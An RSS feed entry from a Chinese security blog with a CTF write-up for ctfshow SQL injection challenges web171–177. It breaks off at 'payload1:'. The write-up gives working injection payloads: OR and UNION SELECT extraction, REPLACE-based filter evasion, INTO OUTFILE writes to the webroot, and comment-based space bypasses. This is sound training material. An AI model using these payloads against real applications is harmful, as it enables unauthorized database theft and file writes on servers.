<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>此时相望不相闻，愿逐月华流照君 • Posts by &#34;sql注入&#34; category</title>
        <link>https://vvwwvv.cn</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Sat, 11 Jan 2025 17:08:15 +0800</pubDate>
        <lastBuildDate>Sat, 11 Jan 2025 17:08:15 +0800</lastBuildDate>
        <category>Java</category>
        <category>xss</category>
        <category>sql</category>
        <category>web</category>
        <category>windows</category>
        <category>渗透</category>
        <category>pwn</category>
        <category>二进制</category>
        <category>C++</category>
        <category>C语言</category>
        <category>Linux</category>
        <category>Apache</category>
        <category>报错</category>
        <category>phppwn</category>
        <category>ctf</category>
        <category>ret2csu</category>
        <category>how2heap</category>
        <category>ret2dlresolve</category>
        <category>fastbin.attack</category>
        <category>nc</category>
        <category>系统调用</category>
        <category>rop</category>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2025/01/11/web/ctfshow_web(SQL%E6%B3%A8%E5%85%A5)/</guid>
            <title>ctfshow_web_()</title>
            <link>https://vvwwvv.cn/2025/01/11/web/ctfshow_web(SQL%E6%B3%A8%E5%85%A5)/</link>
            <category>web</category>
            <pubDate>Sat, 11 Jan 2025 17:08:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
&lt;h2 id=&#34;web171&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web171&#34;&gt;#&lt;/a&gt; web171&lt;/h2&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTExMTkzMjE4ODI2LnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250111193218826.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250111193218826&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;这里有引号判断是 &lt;code&gt;字符型注入&lt;/code&gt; ，&lt;strong&gt;and 优先级高于 or&lt;/strong&gt;，所以先 &lt;code&gt;username !=&#39;flag&#39; and id=&#39;0&#39; &lt;/code&gt; 再 &lt;code&gt;or username=&#39;flag&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里相当于 &lt;code&gt;&#39;id&#39;&lt;/code&gt; 【不用管双引号】，看题目应该是要找到 &lt;code&gt;username=flag&lt;/code&gt; ，可以把前面的判断为假，然后注入一个 &lt;code&gt;or&lt;/code&gt;  来让后面为真：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; or username =  &#39;&lt;/span&gt;flag &lt;span class=&#34;token comment&#34;&gt;#这里 flag 后面不闭合上，因为原本语句最后会加上 `&#39;`&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;得到 flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250111194009203.png&#34; alt=&#34;image-20250111194009203&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web172&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web172&#34;&gt;#&lt;/a&gt; web172&lt;/h2&gt;
&lt;p&gt;直接打开看不见信息，查看源码可以找到：&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTExMjE0NTA1NzAyLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250111214505702.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250111214505702&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;访问 &lt;code&gt;url/select-no-waf-2.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTExMjE0NjA3MTQ5LnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250111214607149.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250111214607149&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;这里应该是将返回值带有 flag 的给屏蔽了，本想直接匹配 &lt;code&gt;password = &#39;ctf%&#39;&lt;/code&gt; ，但是也没有&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; or password=&#39;&lt;/span&gt;ctf&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&#39; &lt;span class=&#34;token comment&#34;&gt;--+  #这里应该是找到了 flag，但是由于返回的字段带有 flag 所以不显示&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;采用 &lt;code&gt;联合查询union&lt;/code&gt; ，要保证前后查询列数相同，不能查询 &lt;code&gt;username&lt;/code&gt; ，所以查询 &lt;code&gt;id&lt;/code&gt;  和 &lt;code&gt;password&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select id , password from ctfshow_user2 --+  #后面没加where条件，所以这里会显示所有的项，由于项数大于1，因此要用 `--+`注释掉后面的limit 1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#后面发现可以加上限制条件：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;1&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; id &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; ctfshow_user2 &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;flag&#39;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;--+ #这里只是找出有 flag 的项，但不显示 username，只有 id 和 password&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTE1NjI0MjYzLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112115624263.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112115624263&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;web173&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web173&#34;&gt;#&lt;/a&gt; web173&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112133612446.png&#34; alt=&#34;image-20250112133612446&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这次还是过滤了返回的 flag，利用 &lt;code&gt;联合注入union&lt;/code&gt; ，不过&lt;strong&gt;注意：这里前面 select 的字段名是三个&lt;/strong&gt;，因此联合注入的字段也需要是三个才能正确显示：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select 1, id ,password from ctfshow_user3 where username=&#39;&lt;/span&gt;flag&#39; &lt;span class=&#34;token comment&#34;&gt;--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112133833745.png&#34; alt=&#34;image-20250112133833745&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web174&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web174&#34;&gt;#&lt;/a&gt; web174&lt;/h2&gt;
&lt;p&gt;一开始进去发现数据库一直异常，查看源码发现，给的页面是 waf3 的，手动访问 waf4&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112143308569.png&#34; alt=&#34;image-20250112143308569&#34; /&gt;&lt;/p&gt;
&lt;p&gt;把数字给过滤了，要把回显的数字给替换成字母，为了不在还原的时候把原本 flag 的字母给还原成数字，这里就要把数字给替换成大写字母：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select &#39;&lt;/span&gt;a&lt;span class=&#34;token string&#34;&gt;&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;A&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;B&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;C&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;D&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;E&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;F&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;G&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;H&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;I&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;J&lt;span class=&#34;token string&#34;&gt;&#39;),&#39;&lt;/span&gt;g&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;K&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; ctfshow_user4 &lt;span class=&#34;token comment&#34;&gt;--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTQzNTMzODcxLnBuZw==&#34;&gt;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112143533871.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20250112143533871&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;接着还原：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ctfshow&amp;#123;JJACCJdA-JbaG-DHbc-aEfH-GBCIFJICBeAA&amp;#125;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;B&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;C&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;D&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;4&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;E&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;5&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;F&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;6&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;G&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;7&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;H&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;I&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;9&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;J&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;K&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;g&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112143649430.png&#34; alt=&#34;image-20250112143649430&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web175&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web175&#34;&gt;#&lt;/a&gt; web175&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112162807516.png&#34; alt=&#34;image-20250112162807516&#34; /&gt;&lt;/p&gt;
&lt;p&gt;过滤了所有 ascii 码，正常回显行不通，这里将输出的数据&lt;strong&gt;指定输出位置&lt;/strong&gt;然后查看就行（利用 &lt;code&gt;into outfile&lt;/code&gt; ）&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select username,passowrd from ctfshow_user5 into outfile &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;www&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;html&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt&#39; &lt;span class=&#34;token comment&#34;&gt;--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112163529024.png&#34; alt=&#34;image-20250112163529024&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着访问 &lt;code&gt;url/flag.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112163552641.png&#34; alt=&#34;image-20250112163552641&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web176&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web176&#34;&gt;#&lt;/a&gt; web176&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112164126965.png&#34; alt=&#34;image-20250112164126965&#34; /&gt;&lt;/p&gt;
&lt;p&gt;对参数进行了过滤，需要慢慢试【看 wp 知道是过滤了 &lt;code&gt;select&lt;/code&gt; ，可大写绕过 &lt;code&gt;Select&lt;/code&gt; 】，我这直接注入就得到了 flag&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; or username=&#39;&lt;/span&gt;flag&#39; &lt;span class=&#34;token comment&#34;&gt;--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112164357015.png&#34; alt=&#34;image-20250112164357015&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web177&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web177&#34;&gt;#&lt;/a&gt; web177&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112164731518.png&#34; alt=&#34;image-20250112164731518&#34; /&gt;&lt;/p&gt;
&lt;p&gt;万能密码试试&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&#39; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--+ #发现回显是无数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; or username=&#39;&lt;/span&gt;flag&#39; &lt;span class=&#34;token comment&#34;&gt;--+ #也不回显&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;接下来试了好多，报错注入，联合注入，布尔盲注，都没有回显，也不报错，用时间注入也不行&lt;/p&gt;
&lt;p&gt;最后看 wp，发现是过滤了 &lt;code&gt;空格&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; and &#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#不能正常显示应该是有过滤。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;||&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#若可以正常显示，那么应该是过滤了空格或者 and （因为上面只有空格和 and 不一致）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;and&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;#没有问题，则就是过滤了空格&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#用 /**/ 绕过空格过滤（/**/ 替换空格）：&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;payload1：&lt;/strong&gt;&lt;/p&gt;
